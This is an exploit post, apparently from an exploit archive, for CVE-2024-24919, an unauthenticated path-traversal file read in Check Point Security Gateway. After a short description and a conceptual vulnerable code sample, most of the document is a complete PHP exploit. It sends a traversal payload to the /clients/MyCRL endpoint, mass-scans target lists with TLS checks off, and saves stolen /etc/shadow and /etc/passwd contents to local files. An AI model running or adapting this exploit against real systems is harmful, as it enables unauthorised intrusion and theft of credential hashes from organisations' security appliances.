@@ -1,0 +1,388 @@
+=============================================================================================================================================
+| # Title     : Check Point Security Gateway R80.40 Unauthenticated Arbitrary File Read                                                     |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.1 (64 bits)                                                            |
+| # Vendor    : https://www.checkpoint.com/                                                                                                 |
+=============================================================================================================================================
+
+POC : 
+
+[+] References : https://packetstorm.news/files/id/181660/ & 	CVE-2024-24919
+
+
+[+] Summary :
+
+A critical unauthenticated arbitrary file read vulnerability exists in Check Point Security Gateway appliances 
+that allows attackers to read any file from the underlying Linux filesystem through path traversal in the web management interface. 
+The vulnerability enables complete system file disclosure without authentication.
+
+[+] Technical Description
+
+The vulnerability exists in the Check Point Security Gateway web management interface, specifically in the `/clients/MyCRL` endpoint. The application fails to properly validate and sanitize user input,
+allowing attackers to perform directory traversal and access arbitrary files outside the intended web directory.
+
+Vulnerable Code Pattern:
+
+java
+
+// Conceptual vulnerable code in file serving component
+@POST
+@Path("/clients/MyCRL")
+public Response serveCRLFile(String filePath) {
+    // Insufficient input validation
+    String resolvedPath = resolveClientPath(filePath);
+    
+    // No proper path traversal detection
+    File requestedFile = new File(baseDirectory, resolvedPath);
+    
+    if (requestedFile.exists()) {
+        return Response.ok(Files.readAllBytes(requestedFile.toPath())).build();
+    }
+    return Response.status(404).build();
+}
+
+[+] Usage: 
+
+# Target List Check
+
+php exploit.php -l targets.txt
+
+# Single Target Check
+
+php exploit.php -u https://checkpoint.example.com
+
+# Custom File Check
+
+php exploit.php -u https://checkpoint.example.com -f etc/hosts
+
+# Bulk Custom File Check
+
+php exploit.php -l targets.txt -f etc/shadow
+
+[+] POC :
+
+<?php
+/**
+ * CVE-2024-24919 Exploit - Check Point Security Gateway Arbitrary File Read
+ * By: indoushka
+ * Converted from Python to PHP
+ */
+
+class CheckPointExploit {
+    private $colors;
+    private $vulnerableIndicators;
+    
+    public function __construct() {
+        $this->colors = [
+            'GREEN'   => "\033[1;32m",
+            'MAGENTA' => "\033[1;35m",
+            'CYAN'    => "\033[1;36m",
+            'RED'     => "\033[1;31m",
+            'BLUE'    => "\033[1;34m",
+            'YELLOW'  => "\033[1;33m",
+            'WHITE'   => "\033[1;37m",
+            'RESET'   => "\033[0m",
+            'BOLD'    => "\033[1m"
+        ];
+        
+        $this->colorArray = [
+            $this->colors['GREEN'],
+            $this->colors['CYAN'], 
+            $this->colors['BLUE']
+        ];
+        
+        $this->vulnerableIndicators = ['root:', 'nobody:', 'daemon:'];
+    }
+    
+    private function color($text, $color) {
+        return $this->colors[$color] . $text . $this->colors['RESET'];
+    }
+    
+    private function randomColor() {
+        return $this->colorArray[array_rand($this->colorArray)];
+    }
+    
+    private function showBanner() {
+        $randomColor = $this->randomColor();
+        
+        $banner = $randomColor . "
+
+ 
+" . $this->colors['RESET'] . 
+$this->colors['MAGENTA'] . "
+
+" . $this->colors['RESET'] .
+$this->colors['RED'] . "\n        CVE-2024-24919 - Check Point Security Gateway File Read\n" . $this->colors['RESET'] .
+$this->colors['WHITE'] . "                    @indoushka\n\n" . $this->colors['RESET'];
+
+        echo $banner;
+    }
+    
+    private function makeRequest($url, $payload = null, $headers = []) {
+        $contextOptions = [
+            'http' => [
+                'method' => 'POST',
+                'header' => implode("\r\n", $headers),
+                'content' => $payload,
+                'timeout' => 10,
+                'ignore_errors' => true,
+                'follow_location' => false
+            ],
+            'ssl' => [
+                'verify_peer' => false,
+                'verify_peer_name' => false
+            ]
+        ];
+        
+        $context = stream_context_create($contextOptions);
+        $response = @file_get_contents($url, false, $context);
+        
+        if ($response === false) {
+            return ['success' => false, 'error' => 'Request failed'];
+        }
+        
+        // Get HTTP status code
+        $statusCode = 0;
+        if (isset($http_response_header[0])) {
+            preg_match('/HTTP\/\d\.\d\s+(\d+)/', $http_response_header[0], $matches);
+            $statusCode = isset($matches[1]) ? (int)$matches[1] : 0;
+        }
+        
+        return [
+            'success' => true,
+            'status_code' => $statusCode,
+            'content' => $response
+        ];
+    }
+    
+    private function isVulnerable($content) {
+        foreach ($this->vulnerableIndicators as $indicator) {
+            if (strpos($content, $indicator) !== false) {
+                return true;
+            }
+        }
+        return false;
+    }
+    
+    private function displayResult($url, $response, $payload) {
+        if (!$response['success']) {
+            echo $this->color("[-] Error: " . $response['error'], 'RED') . "\n";
+            return;
+        }
+        
+        if ($response['status_code'] === 200 && $this->isVulnerable($response['content'])) {
+            echo $this->color("[+] " . $url . " is VULNERABLE", 'GREEN') . "\n";
+            
+            if ($payload) {
+                if (strpos($payload, 'etc/shadow') !== false) {
+                    echo $this->color("╔══════════════════════════════════════════════════════╗", 'CYAN') . "\n";
+                    echo $this->color("║                      /etc/shadow found               ║", 'CYAN') . "\n";
+                    echo $this->color("╚══════════════════════════════════════════════════════╝", 'CYAN') . "\n";
+                    
+                    if (file_put_contents("shadow.txt", $response['content']) !== false) {
+                        echo $this->color("[+] Shadow file saved as: shadow.txt", 'GREEN') . "\n";
+                    }
+                } elseif (strpos($payload, 'etc/passwd') !== false) {
+                    echo $this->color("╔══════════════════════════════════════════════════════╗", 'CYAN') . "\n";
+                    echo $this->color("║                      /etc/passwd found               ║", 'CYAN') . "\n";
+                    echo $this->color("╚══════════════════════════════════════════════════════╝", 'CYAN') . "\n";
+                    
+                    if (file_put_contents("passwd.txt", $response['content']) !== false) {
+                        echo $this->color("[+] Passwd file saved as: passwd.txt", 'GREEN') . "\n";
+                    }
+                }
+                
+                echo $this->color("╔══════════════════════════════════════════════════════╗", 'CYAN') . "\n";
+                echo $this->color("File content:", 'WHITE') . "\n";
+                echo $response['content'] . "\n";
+                echo $this->color("╚══════════════════════════════════════════════════════╝", 'CYAN') . "\n";
+            }
+        } else {
+            echo $this->color("[-] " . $url . " is not vulnerable (Status: " . $response['status_code'] . ")", 'RED') . "\n";
+        }
+    }
+    
+    public function scanTargets($targetsFile, $customFile = null) {
+        $this->showBanner();
+        
+        if (!file_exists($targetsFile)) {
+            echo $this->color("[-] File not found: " . $targetsFile, 'RED') . "\n";
+            return;
+        }
+        
+        $urls = file($targetsFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+        $urls = array_map('trim', $urls);
+        
+        echo $this->color("[*] Scanning " . count($urls) . " targets...\n", 'BLUE');
+        
+        $headers = [
+            "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+            "Accept-Language: en-US,en;q=0.5",
+            "Accept-Encoding: gzip, deflate, br",
+            "Upgrade-Insecure-Requests: 1",
+            "Sec-Fetch-Dest: document",
+            "Sec-Fetch-Mode: navigate",
+            "Sec-Fetch-Site: none",
+            "Sec-Fetch-User: ?1",
+            "Dnt: 1",
+            "Sec-Gpc: 1",
+            "Te: trailers",
+            "Connection: close"
+        ];
+        
+        $payloadBase = "aCSHELL/../../../../../../../";
+        
+        $payloads = [
+            $payloadBase . "etc/passwd",
+            $payloadBase . "etc/shadow"
+        ];
+        
+        if ($customFile) {
+            $payloads = [$payloadBase . $customFile];
+        }
+        
+        $vulnerableCount = 0;
+        
+        foreach ($urls as $index => $url) {
+            echo $this->color("\n[" . ($index + 1) . "/" . count($urls) . "] Testing: ", 'BLUE') . $url . "\n";
+            
+            if (!preg_match('/^https?:\/\//', $url)) {
+                echo $this->color("[-] Invalid URL format, skipping", 'YELLOW') . "\n";
+                continue;
+            }
+            
+            $targetUrl = rtrim($url, '/') . '/clients/MyCRL';
+            
+            foreach ($payloads as $payload) {
+                echo $this->color("[*] Testing payload: ", 'YELLOW') . $payload . "\n";
+                
+                $response = $this->makeRequest($targetUrl, $payload, $headers);
+                
+                if ($response['success'] && $response['status_code'] === 200 && $this->isVulnerable($response['content'])) {
+                    $this->displayResult($targetUrl, $response, $payload);
+                    $vulnerableCount++;
+                    break; // Stop testing this target if vulnerable
+                }
+            }
+        }
+        
+        // Summary
+        echo $this->color("\n" . str_repeat("=", 60), 'CYAN') . "\n";
+        echo $this->color("[*] SCAN SUMMARY", 'BOLD') . "\n";
+        echo $this->color(str_repeat("=", 60), 'CYAN') . "\n";
+        echo $this->color("[+] Total targets scanned: ", 'BLUE') . count($urls) . "\n";
+        echo $this->color("[+] Vulnerable targets found: ", 
+            $vulnerableCount > 0 ? 'GREEN' : 'RED') . $vulnerableCount . "\n";
+    }
+    
+    public function testSingleTarget($url, $customFile = null) {
+        $this->showBanner();
+        
+        echo $this->color("[*] Testing single target: ", 'BLUE') . $url . "\n\n";
+        
+        $headers = [
+            "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+            "Accept-Language: en-US,en;q=0.5",
+            "Content-Type: application/x-www-form-urlencoded",
+            "Connection: close"
+        ];
+        
+        $payloadBase = "aCSHELL/../../../../../../../";
+        
+        $testFiles = [
+            "etc/passwd" => "System password file",
+            "etc/shadow" => "System shadow file", 
+            "etc/hosts" => "System hosts file",
+            "etc/group" => "System groups file"
+        ];
+        
+        if ($customFile) {
+            $testFiles = [$customFile => "Custom file: " . $customFile];
+        }
+        
+        $vulnerable = false;
+        
+        foreach ($testFiles as $file => $description) {
+            echo $this->color("[*] Testing: ", 'YELLOW') . $description . "\n";
+            
+            $payload = $payloadBase . $file;
+            $targetUrl = rtrim($url, '/') . '/clients/MyCRL';
+            
+            $response = $this->makeRequest($targetUrl, $payload, $headers);
+            
+            if ($response['success'] && $response['status_code'] === 200) {
+                if ($this->isVulnerable($response['content']) || !empty(trim($response['content']))) {
+                    echo $this->color("[+] FILE ACCESSIBLE: " . $description, 'GREEN') . "\n";
+                    echo $this->color("[+] Content preview:\n", 'GREEN');
+                    echo $this->color(str_repeat("=", 60), 'CYAN') . "\n";
+                    echo substr($response['content'], 0, 500) . "\n";
+                    echo $this->color(str_repeat("=", 60), 'CYAN') . "\n";
+                    
+                    // Save file
+                    $filename = str_replace('/', '_', $file) . ".txt";
+                    file_put_contents($filename, $response['content']);
+                    echo $this->color("[+] Saved to: " . $filename, 'CYAN') . "\n";
+                    
+                    $vulnerable = true;
+                } else {
+                    echo $this->color("[-] File not accessible or empty", 'RED') . "\n";
+                }
+            } else {
+                echo $this->color("[-] Request failed (Status: " . $response['status_code'] . ")", 'RED') . "\n";
+            }
+            echo "\n";
+        }
+        
+        if ($vulnerable) {
+            echo $this->color("[+] TARGET IS VULNERABLE to CVE-2024-24919!", 'GREEN') . "\n";
+        } else {
+            echo $this->color("[-] Target does not appear to be vulnerable", 'RED') . "\n";
+        }
+    }
+}
+
+// Main execution
+if (php_sapi_name() === 'cli') {
+    $shortOptions = "l:f:u:h";
+    $longOptions = ["list:", "file:", "url:", "help"];
+    
+    $options = getopt($shortOptions, $longOptions);
+    
+    if (isset($options['h']) || isset($options['help']) || empty($options)) {
+        echo "CVE-2024-24919 - Check Point Security Gateway Arbitrary File Read\n";
+        echo "Usage:\n";
+        echo "  php exploit.php -l <targets_list.txt> [-f <custom_file>]\n";
+        echo "  php exploit.php -u <target_url> [-f <custom_file>]\n";
+        echo "\nExamples:\n";
+        echo "  php exploit.php -l targets.txt\n";
+        echo "  php exploit.php -u https://checkpoint.example.com\n";
+        echo "  php exploit.php -u https://checkpoint.example.com -f etc/hosts\n";
+        echo "  php exploit.php -l targets.txt -f etc/shadow\n";
+        echo "\nDescription:\n";
+        echo "  Exploits arbitrary file read vulnerability in Check Point Security Gateway\n";
+        echo "  via path traversal in /clients/MyCRL endpoint (CVE-2024-24919)\n";
+        exit(0);
+    }
+    
+    $exploit = new CheckPointExploit();
+    
+    if (isset($options['l']) || isset($options['list'])) {
+        $listFile = $options['l'] ?? $options['list'];
+        $customFile = $options['f'] ?? $options['file'] ?? null;
+        $exploit->scanTargets($listFile, $customFile);
+    } 
+    elseif (isset($options['u']) || isset($options['url'])) {
+        $url = $options['u'] ?? $options['url'];
+        $customFile = $options['f'] ?? $options['file'] ?? null;
+        $exploit->testSingleTarget($url, $customFile);
+    }
+} else {
+    echo "This script is intended for command line use only.\n";
+}
+?>
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
